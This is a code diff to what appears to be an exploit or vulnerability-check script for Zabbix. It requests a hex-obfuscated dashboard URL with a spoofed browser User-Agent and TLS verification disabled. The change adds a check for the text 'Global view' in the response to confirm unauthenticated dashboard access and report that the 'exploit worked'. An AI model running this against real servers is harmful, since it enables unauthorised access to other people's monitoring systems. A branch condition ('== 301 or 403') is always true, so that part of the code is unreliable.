@@ -60,6 +60,8 @@ def version_check(target_url):
 def exploit(target_url):
     payload = "\x2f\x7a\x61\x62\x62\x69\x78\x2f\x7a\x61\x62\x62\x69\x78\x2e\x70\x68\x70\x3f\x61\x63\x74\x69\x6f\x6e\x3d\x64\x61\x73\x68\x62\x6f\x61\x72\x64\x2e\x76\x69\x65\x77\x26\x64\x61\x73\x68\x62\x6f\x61\x72\x64\x69\x64\x3d\x31"
 
+    dashboard_text = "Global view"
+
     headers = {
         "User-Agent": "Opera/9.61 (Macintosh; Intel Mac OS X; U; de) Presto/2.1.1",
         "Referer": target_url,
@@ -71,8 +73,9 @@ def exploit(target_url):
     try:
         payload_request = requests.get(url_payload, headers=headers, verify=False, timeout=10)
         payload_response = payload_request.status_code
+        payload_body = payload_request.text
 
-        if(payload_response == 200):
+        if(payload_response == 200 and dashboard_text in payload_body):
             print("\n[green]:: The target is vulnerable, exploit worked.[/]")
             print(f"[green]:: URL: {url_payload}\n")
         elif(payload_response == 301 or 403):
